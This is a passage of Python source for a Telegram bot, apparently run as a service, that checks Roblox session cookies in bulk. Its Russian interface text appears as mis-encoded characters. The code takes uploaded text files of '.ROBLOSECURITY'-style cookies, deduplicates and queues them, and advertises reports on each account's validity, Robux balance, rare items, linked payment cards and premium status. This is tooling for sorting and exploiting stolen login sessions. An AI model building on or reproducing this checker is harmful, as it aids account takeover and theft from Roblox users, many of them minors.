        [InlineKeyboardButton(text="üòÆ‚Äçüí® –í–∞–ª–∏–¥–∞—Ç–æ—ÄüòÆ‚Äçüí®", callback_data="validator"),
         InlineKeyboardButton(text="üå¥ –ü–æ–¥–¥–µ—Ä–∂–∫–∞üå¥", callback_data="support")]
    ])
    
    await message.answer( 
        f'<b>‚ú®  |  –ü—Ä–∏–≤–µ—Ç—Å—Ç–≤—É—é, @{message.from_user.username}!  |  ‚ú®</b>\n\n'
        '„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞\n'
        '<b>ü™Ñ  @sparklchecker_bot  ‚Äî  —Ç–≤–æ–π –º–∞–≥–∏—á–µ—Å–∫–∏–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç</b>\n\n'
        '‚ñ´Ô∏è <b>–í–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏:</b>\n'
        '   ‚àü üß™ –ü—Ä–æ–≤–µ—Ä–∫–∞ Roblox cookies\n'
        '   ‚àü üíé –ê–Ω–∞–ª–∏–∑ –±–∞–ª–∞–Ω—Å–∞ Robux\n'
        '   ‚àü üèÜ –ü–æ–∏—Å–∫ —Ä–µ–¥–∫–∏—Ö –ø—Ä–µ–¥–º–µ—Ç–æ–≤\n'
        '   ‚àü üí≥ –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∏–≤—è–∑–∞–Ω–Ω—ã—Ö –∫–∞—Ä—Ç\n'
        '   ‚àü üõ°Ô∏è –ü–æ–∏—Å–∫ –±–µ–π–¥–∂–µ–π –∏ –≥–µ–π–º–ø–∞—Å–æ–≤\n\n'
        '„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞\n\n'
        '<b>üìØ  –ö–æ–º–∞–Ω–¥—ã:</b>\n'
        '   ‚àü <code>üç™ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å Cookie</code> ‚Äî –∑–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏\n'
        '   ‚àü <code>‚öôÔ∏è –ü—Ä–æ—Ñ–∏–ª—å </code> ‚Äî –≤–∞—à –ø—Ä–æ—Ñ–∏–ª—å\n\n'
        '<tg-spoiler>üîí –í–∞—à–∏ –∫—É–∫–∏ –Ω–∏–∫–æ–≥–¥–∞ –Ω–µ —Å–æ—Ö—Ä–∞–Ω—è—é—Ç—Å—è</tg-spoiler>',
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await log_to_admin("–ó–∞–ø—É—Å—Ç–∏–ª –±–æ—Ç–∞", message.from_user.id, message.from_user.username)

@router.callback_query(F.data == "cookie_check")
async def cookie_check_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"‚ùå –í—ã –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã. –ü—Ä–∏—á–∏–Ω–∞: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="ü©∏ –ù–∞—á–∞—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É", callback_data="start_check")],
        [
            InlineKeyboardButton(text="üéñÔ∏è –£–∫–∞–∑–∞—Ç—å –±—ç–π–¥–∂–∏", callback_data="set_badge"),
            InlineKeyboardButton(text="üéÆ –£–∫–∞–∑–∞—Ç—å –≥–µ–π–º–ø–∞—Å—Å—ã", callback_data="set_gp")
        ],
        [InlineKeyboardButton(text="üîô –ù–∞–∑–∞–¥", callback_data="back_to_main")]
    ])
    
    await callback.message.edit_text(
    '<b>üç™ –ú–ï–ù–Æ –ü–†–û–í–ï–†–ö–ò COOKIE</b>\n\n'
    '<code>‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ</code>\n'
    '<b>‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –ø—Ä–æ–≤–µ—Ä–∫–∏:</b>\n\n'
    '<b>‚ñ´ 1. –ë—ç–π–¥–∂–∏</b> ‚ûî ID —á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é\n'
    '<b>‚ñ´ 2. –ì–µ–π–º–ø–∞—Å—Å—ã</b> ‚ûî ID —á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é\n\n'
    '<b>üìå –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è:</b>\n'
    '‚ù∂ –ù–∞–∂–º–∏—Ç–µ "<i>üöÄ –ù–∞—á–∞—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É</i>"\n'
    '‚ù∑ –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª (<code>.txt</code>)\n'
    '‚ù∏ –ü–æ–ª—É—á–∏—Ç–µ <i>üìà –¥–µ—Ç–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –æ—Ç—á—ë—Ç</i>\n\n'
    '<b>‚ö†Ô∏è –í–Ω–∏–º–∞–Ω–∏–µ:</b>\n'
    '‚ñ´ –ú–∞–∫—Å. —Ä–∞–∑–º–µ—Ä: <code>20MB</code>\n'
    '‚ñ´ –í—Ä–µ–º—è –ø—Ä–æ–≤–µ—Ä–∫–∏: –∑–∞–≤–∏—Å–∏—Ç –æ—Ç –æ–±—ä—ë–º–∞\n'
    '<code>‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ</code>\n\n'
    '<i>¬´–ù–∞—à —á–µ–∫–µ—Ä ‚Äî —Å—Ç–∞–±–∏–ª—å–Ω–æ—Å—Ç—å –∏ —Å–∫–æ—Ä–æ—Å—Ç—å¬ª</i>',
    parse_mode=ParseMode.HTML,
    reply_markup=keyboard
)

@router.callback_query(F.data == "start_check")
async def start_check(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"‚ùå –í—ã –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã. –ü—Ä–∏—á–∏–Ω–∞: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="üîô –ù–∞–∑–∞–¥", callback_data="cookie_check")]
    ])
    
    await callback.message.answer(
    '<b>üìå –ò–ù–°–¢–†–£–ö–¶–ò–Ø –ü–û –ü–†–û–í–ï–†–ö–ï</b>\n\n'
    '<code>‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ</code>\n\n'
    '‚ù∂ <b>–ü–æ–¥–≥–æ—Ç–æ–≤—å—Ç–µ</b> —Ñ–∞–π–ª —Å –∫—É–∫–∞–º–∏ (<code>.txt</code>)\n'
    '‚ù∑ <b>–û—Ç–ø—Ä–∞–≤—å—Ç–µ</b> —Ñ–∞–π–ª –≤ —ç—Ç–æ—Ç —á–∞—Ç\n\n'
    '<b>‚ö†Ô∏è –¢—Ä–µ–±–æ–≤–∞–Ω–∏—è:</b>\n'
    '‚ñ∏ –§–æ—Ä–º–∞—Ç: <code>–¢–û–õ–¨–ö–û TXT</code>\n'
    '‚ñ∏ –ú–∞–∫—Å. —Ä–∞–∑–º–µ—Ä: <code>20MB</code>\n'
    '‚ñ∏ –ö–∞–∂–¥—ã–π –∫—É–∫ ‚Üí –Ω–æ–≤–∞—è —Å—Ç—Ä–æ–∫–∞\n\n'
    '<b>üîç –ü—Ä–æ–≤–µ—Ä—è–µ–º—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã:</b>\n'
    '‚óà –í–∞–ª–∏–¥–Ω–æ—Å—Ç—å –∫—É–∫–∏\n'
    '‚óà –ë–∞–ª–∞–Ω—Å Robux\n'
    '‚óà –†–µ–¥–∫–∏–µ –ø—Ä–µ–¥–º–µ—Ç—ã\n'
    '‚óà –ü—Ä–∏–≤—è–∑–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã\n'
    '‚óà –ü—Ä–µ–º–∏—É–º —Å—Ç–∞—Ç—É—Å\n'
    '‚óà –ë–µ–π–¥–∂–∏/–≥–µ–π–º–ø–∞—Å—Å—ã\n\n'
    '<code>‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ‚îÖ</code>\n'
    '<i>¬´–û–∂–∏–¥–∞—é –≤–∞—à —Ñ–∞–π–ª...¬ª</i>',
    parse_mode=ParseMode.HTML,
    reply_markup=keyboard
)
    await state.set_state(Form.file)

def process_cookie_file(file_path: str):
    valid_cookies = set()
    invalid_lines = 0
    total_lines = 0
    duplicates = 0
    
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            total_lines += 1
            line = line.strip()
            if '_|WARNING:-DO-NOT-SHARE-THIS.' in line:
                try:
                    cookie = line.split('_|WARNING:-DO-NOT-SHARE-THIS.')[1].split()[0]
                    full_cookie = f'_|WARNING:-DO-NOT-SHARE-THIS.{cookie}'
                    if full_cookie in valid_cookies:
                        duplicates += 1
                    else:
                        valid_cookies.add(full_cookie)
                except:
                    invalid_lines += 1
            else:
                invalid_lines += 1
    
    return {
        'cookies': list(valid_cookies),
        'total_lines': total_lines,
        'invalid_lines': invalid_lines,
        'duplicates': duplicates
    }

@router.message(Form.file)
async def process_file(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(f"‚ùå –í—ã –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã. –ü—Ä–∏—á–∏–Ω–∞: {reason}", parse_mode=ParseMode.HTML)
        return
    
    file_path = None
    try:
        if not message.document:
            await message.answer("<b>‚ùå –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª —Å –∫—É–∫–∞–º–∏.</b>", parse_mode=ParseMode.HTML)
            return

        if not message.document.file_name.endswith('.txt'):
            await message.answer("<b>‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç —Ñ–∞–π–ª–∞. –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ç–µ–∫—Å—Ç–æ–≤—ã–π —Ñ–∞–π–ª (txt).</b>", parse_mode=ParseMode.HTML)
            return

        file_id = message.document.file_id
        file_name = f"{random.randint(100000, 999999)}.txt"
        file_path = f"{COOKIE_FILES_DIR}{file_name}"
        
        msg = await message.answer("<b>‚è≥ –°–∫–∞—á–∏–≤–∞—é —Ñ–∞–π–ª... –≠—Ç–æ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –≤—Ä–µ–º—è –¥–ª—è –±–æ–ª—å—à–∏—Ö —Ñ–∞–π–ª–æ–≤.</b>", parse_mode=ParseMode.HTML)
        
        await bot.download(file_id, destination=file_path)
        
        file_info = process_cookie_file(file_path)
        
        if not file_info['cookies']:
            await msg.edit_text("<b>‚ùå –í —Ñ–∞–π–ª–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ –≤–∞–ª–∏–¥–Ω—ã—Ö cookies. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ —Ñ–æ—Ä–º–∞—Ç —Ñ–∞–π–ª–∞.</b>", parse_mode=ParseMode.HTML)
            return
        
        check_queue.put((message.from_user.id, file_info, msg))
        queue_size = check_queue.qsize()
        
        if current_checking is None:
            status_msg = (
                "<b>üìä –§–ê–ô–õ –î–û–ë–ê–í–õ–ï–ù –í –û–ß–ï–†–ï–î–¨</b>\n\n"
                "ÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπå\n"
                f"üìù –í—Å–µ–≥–æ —Å—Ç—Ä–æ–∫: <b>{file_info['total_lines']}</b>\n"
                f"‚úÖ –í–∞–ª–∏–¥–Ω—ã—Ö –∫—É–∫–∏: <b>{len(file_info['cookies'])}</b>\n"
                f"‚ôªÔ∏è –î—É–±–ª–∏–∫–∞—Ç–æ–≤: <b>{file_info['duplicates']}</b>\n"
                f"‚ùå –ù–µ–≤–∞–ª–∏–¥–Ω—ã—Ö —Å—Ç—Ä–æ–∫: <b>{file_info['invalid_lines']}</b>\n\n"
                "‚è≥ –û–∂–∏–¥–∞–π—Ç–µ –Ω–∞—á–∞–ª–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏..."
            )
        else:
            status_msg = (
                "<b>üìä –§–ê–ô–õ –î–û–ë–ê–í–õ–ï–ù –í –û–ß–ï–†–ï–î–¨</b>\n\n"
                "ÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπå\n"
                f"üìù –í—Å–µ–≥–æ —Å—Ç—Ä–æ–∫: <b>{file_info['total_lines']}</b>\n"
                f"‚úÖ –í–∞–ª–∏–¥–Ω—ã—Ö –∫—É–∫–∏: <b>{len(file_info['cookies'])}</b>\n"
                f"‚ôªÔ∏è –î—É–±–ª–∏–∫–∞—Ç–æ–≤: <b>{file_info['duplicates']}</b>\n"
                f"‚ùå –ù–µ–≤–∞–ª–∏–¥–Ω—ã—Ö —Å—Ç—Ä–æ–∫: <b>{file_info['invalid_lines']}</b>\n\n"
                f"üìä –í–∞—à–∞ –ø–æ–∑–∏—Ü–∏—è –≤ –æ—á–µ—Ä–µ–¥–∏: <b>{queue_size}</b>\n"
                f"üïí –ü—Ä–∏–º–µ—Ä–Ω–æ–µ –≤—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è: <b>{queue_size * 2}-{queue_size * 5} –º–∏–Ω—É—Ç</b>\n\n"
                "üîÑ –°—Ç–∞—Ç—É—Å –æ—á–µ—Ä–µ–¥–∏ –±—É–¥–µ—Ç –æ–±–Ω–æ–≤–ª—è—Ç—å—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏."
            )
        
        await msg.edit_text(status_msg, parse_mode=ParseMode.HTML)
        await notify_queue_update()
            
    except Exception as e:
        error_message = (
            f"<b>‚ùå –û–®–ò–ë–ö–ê –û–ë–†–ê–ë–û–¢–ö–ò –§–ê–ô–õ–ê</b>\n\n"
            f"ÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπå\n"
            f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ —Ñ–∞–π–ª–∞:\n"
            f"<code>{str(e)}</code>\n\n"
            f"–ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑ –∏–ª–∏ –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É."
        )
        await message.answer(error_message, parse_mode=ParseMode.HTML)
        logging.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Ñ–∞–π–ª–∞: {e}")
    finally:
        if file_path and os.path.exists(file_path):
            os.remove(file_path)

@router.callback_query(F.data == "profile")
async def show_profile(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"‚ùå –í—ã –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã. –ü—Ä–∏—á–∏–Ω–∞: {reason}", show_alert=True)
        return
    
    config = Database.get_user_config(callback.from_user.id)
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="üìú –ò—Å—Ç–æ—Ä–∏—è –ø—Ä–æ–≤–µ—Ä–æ–∫", callback_data="history")],
        [InlineKeyboardButton(text="üîô –ù–∞–∑–∞–¥", callback_data="back_to_main")]
    ])
    
    await callback.message.edit_text(
    f'<b>üëë  |  –ü–†–û–§–ò–õ–¨  |  üëë</b>\n\n'
    f'‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨\n'
    f'<b>üîπ –û—Å–Ω–æ–≤–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:</b>\n'
    f'   ‚àü üÜî <b>ID:</b> <code>{callback.from_user.id}</code>\n'
    f'   ‚àü üë§ <b>Username:</b> @{callback.from_user.username}\n\n'
    
    f'<b>üîπ –ê–∫—Ç–∏–≤–Ω–æ—Å—Ç—å:</b>\n'
    f'   ‚àü üìÖ <b>–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è:</b> <i>{config["registration_date"]}</i>\n'
    f'   ‚àü ‚è± <b>–ü–æ—Å–ª–µ–¥–Ω–µ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ:</b> <i>{config.get("last_activity", "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")}</i>\n\n'
    
    f'<b>üîπ –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø—Ä–æ–≤–µ—Ä–æ–∫:</b>\n'
    f'   ‚àü üìä <b>–í—Å–µ–≥–æ –ø—Ä–æ–≤–µ—Ä–æ–∫:</b> <code>{config["cookie_check_count"]}</code>\n'
    f'   ‚àü üç™ <b>–ü—Ä–æ–≤–µ—Ä–µ–Ω–æ –∫—É–∫–∏:</b> <code>{config.get("total_checks", 0)}</code>\n'
    f'   ‚àü ‚úÖ <b>–í–∞–ª–∏–¥–Ω—ã—Ö:</b> <code>{config.get("valid_cookies_found", 0)}</code>\n'
    f'   ‚àü ‚ùå <b>–ù–µ–≤–∞–ª–∏–¥–Ω—ã—Ö:</b> <code>{config.get("invalid_cookies_found", 0)}</code>\n\n'
    
    f'<b>üîπ –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –ø—Ä–æ–≤–µ—Ä–∫–∏:</b>\n'
    f'   ‚àü üéñÔ∏è <b>–ë–µ–π–¥–∂–∏:</b> <i>{", ".join(config["badges"]) if config["badges"] else "–ù–µ —É–∫–∞–∑–∞–Ω—ã"}</i>\n'
    f'   ‚àü üéÆ <b>–ì–µ–π–º–ø–∞—Å—Å—ã:</b> <i>{", ".join(config["gamepasses"]) if config["gamepasses"] else "–ù–µ —É–∫–∞–∑–∞–Ω—ã"}</i>\n\n'
    
    f'‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨\n'
    f'<tg-spoiler>üìå –î–∞–Ω–Ω—ã–µ –æ–±–Ω–æ–≤–ª—è—é—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏</tg-spoiler>',
    parse_mode=ParseMode.HTML,
    reply_markup=keyboard
)

@router.callback_query(F.data == "set_badge")
async def set_badges(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"‚ùå –í—ã –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã. –ü—Ä–∏—á–∏–Ω–∞: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="üîô –ù–∞–∑–∞–¥", callback_data="cookie_check")]
    ])
    
    await callback.message.answer(
        "<b>üéñÔ∏è –í–≤–µ–¥–∏—Ç–µ ID –±–µ–π–¥–∂–µ–π —á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é:</b>\n\n"
        "<i>–ü—Ä–∏–º–µ—Ä: 123456,789012,345678</i>\n\n"
        "<b>–ß—Ç–æ–±—ã –æ—Ç–∫–ª—é—á–∏—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É –±–µ–π–¥–∂–µ–π, –≤–≤–µ–¥–∏—Ç–µ</b> <code>None</code>",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.set_state(Form.badge)

@router.message(Form.badge)
async def save_badges(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(f"‚ùå –í—ã –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã. –ü—Ä–∏—á–∏–Ω–∞: {reason}", parse_mode=ParseMode.HTML)
        return
    
    badges = message.text.strip()
    if badges.lower() == 'none':
        badges = []
        response_text = "<b>‚úÖ –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–π–¥–∂–µ–π –æ—Ç–∫–ª—é—á–µ–Ω–∞</b>"
    else:
        try:
            badges = [b.strip() for b in badges.split(',') if b.strip().isdigit()]
            if not badges:
                raise ValueError("–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç")
            response_text = f"<b>‚úÖ –ë—ç–π–¥–∂–∏ —É—Å–ø–µ—à–Ω–æ –æ–±–Ω–æ–≤–ª–µ–Ω—ã! (–î–æ–±–∞–≤–ª–µ–Ω–æ: {len(badges)})</b>"
        except Exception as e:
            await message.answer(
                "<b>‚ùå –û—à–∏–±–∫–∞ —Ñ–æ—Ä–º–∞—Ç–∞. –í–≤–µ–¥–∏—Ç–µ ID –±–µ–π–¥–∂–µ–π —á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é –∏–ª–∏ None –¥–ª—è –æ—Ç–∫–ª—é—á–µ–Ω–∏—è.</b>",
                parse_mode=ParseMode.HTML
            )
            return
    
    Database.update_config(message.from_user.id, 'badges', badges)
    await message.answer(response_text, parse_mode=ParseMode.HTML)
    await state.clear()

@router.callback_query(F.data == "set_gp")
async def set_gamepasses(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"‚ùå –í—ã –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã. –ü—Ä–∏—á–∏–Ω–∞: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="üîô –ù–∞–∑–∞–¥", callback_data="cookie_check")]
    ])
    
    await callback.message.answer(
        "<b>üéÆ –í–≤–µ–¥–∏—Ç–µ ID –≥–µ–π–º–ø–∞—Å—Å–æ–≤ —á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é:</b>\n\n"
        "<i>–ü—Ä–∏–º–µ—Ä: 123456,789012,345678</i>\n\n"
        "<b>–ß—Ç–æ–±—ã –æ—Ç–∫–ª—é—á–∏—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É –≥–µ–π–º–ø–∞—Å—Å–æ–≤, –≤–≤–µ–¥–∏—Ç–µ</b> <code>None</code>",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.set_state(Form.gamepass)

@router.message(Form.gamepass)
async def save_gamepasses(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(f"‚ùå –í—ã –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã. –ü—Ä–∏—á–∏–Ω–∞: {reason}", parse_mode=ParseMode.HTML)
        return
    
    gamepasses = message.text.strip()
    user_path, _ = Database.register_user(user_id)
    if gamepasses.lower() == 'none':
        gamepasses = []
        response_text = "<b>‚úÖ –ü—Ä–æ–≤–µ—Ä–∫–∞ –≥–µ–π–º–ø–∞—Å—Å–æ–≤ –æ—Ç–∫–ª—é—á–µ–Ω–∞</b>"
    else:
        try:
            gamepasses = [gp.strip() for gp in gamepasses.split(',') if gp.strip().isdigit()]
            if not gamepasses:
                raise ValueError("–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç")
            response_text = f"<b>‚úÖ –ì–µ–π–º–ø–∞—Å—Å—ã —É—Å–ø–µ—à–Ω–æ –æ–±–Ω–æ–≤–ª–µ–Ω—ã! (–î–æ–±–∞–≤–ª–µ–Ω–æ: {len(gamepasses)})</b>"
        except Exception as e:
            await message.answer(
                "<b>‚ùå –û—à–∏–±–∫–∞ —Ñ–æ—Ä–º–∞—Ç–∞. –í–≤–µ–¥–∏—Ç–µ ID –≥–µ–π–º–ø–∞—Å—Å–æ–≤ —á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é –∏–ª–∏ None –¥–ª—è –æ—Ç–∫–ª—é—á–µ–Ω–∏—è.</b>",
                parse_mode=ParseMode.HTML
            )
            return
    
    Database.update_config(message.from_user.id, 'gamepasses', gamepasses)
    await message.answer(response_text, parse_mode=ParseMode.HTML)
    await state.clear()

@router.callback_query(F.data == "history")
async def show_history(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"‚ùå –í—ã –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã. –ü—Ä–∏—á–∏–Ω–∞: {reason}", show_alert=True)
        return
    
    user_dir = f'{DATABASE_DIR}{callback.from_user.id}/checks/'
    if not os.path.exists(user_dir):
        await callback.message.answer("<b>üìú –ò—Å—Ç–æ—Ä–∏—è –ø—Ä–æ–≤–µ—Ä–æ–∫ –ø—É—Å—Ç–∞</b>", parse_mode=ParseMode.HTML)
        return
    
    checks = sorted(os.listdir(user_dir), reverse=True)
    if not checks:
        await callback.message.answer("<b>üìú –ò—Å—Ç–æ—Ä–∏—è –ø—Ä–æ–≤–µ—Ä–æ–∫ –ø—É—Å—Ç–∞</b>", parse_mode=ParseMode.HTML)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"üìÖ {check}", callback_data=f"check_{check}")] for check in checks[:10]
    ] + [[InlineKeyboardButton(text="üîô –ù–∞–∑–∞–¥", callback_data="profile")]])
    
    await callback.message.edit_text(
        "<b>üìú –ò—Å—Ç–æ—Ä–∏—è –≤–∞—à–∏—Ö –ø—Ä–æ–≤–µ—Ä–æ–∫:</b>\n\n"
        "–í—ã–±–µ—Ä–∏—Ç–µ –ø—Ä–æ–≤–µ—Ä–∫—É –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤:",
        reply_markup=keyboard,
        parse_mode=ParseMode.HTML
    )

@router.callback_query(F.data.startswith("check_"))
async def send_check_files(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"‚ùå –í—ã –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã. –ü—Ä–∏—á–∏–Ω–∞: {reason}", show_alert=True)
        return
    
    check_id = callback.data.split('_', 1)[1]
    check_dir = f'{DATABASE_DIR}{callback.from_user.id}/checks/{check_id}/'
    
    if not os.path.exists(check_dir):
        await callback.answer("‚ùå –†–µ–∑—É–ª—å—Ç–∞—Ç—ã –ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã", show_alert=True)
        return
    
    files = []
    for fname in sorted(os.listdir(check_dir)):
        if fname.endswith('.txt'):
            file_path = f'{check_dir}{fname}'
            if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
                files.append(InputMediaDocument(media=FSInputFile(file_path)))
    
    if files:
        files[-1].caption = f"üìú –†–µ–∑—É–ª—å—Ç–∞—Ç—ã –ø—Ä–æ–≤–µ—Ä–∫–∏ –æ—Ç {check_id}"
        await callback.message.answer_media_group(files)
        await callback.answer()
    else:
        await callback.answer("‚ùå –ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –æ—Ç—á–µ—Ç–∞", show_alert=True)

@router.callback_query(F.data == "back_to_main")
async def back_to_main(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
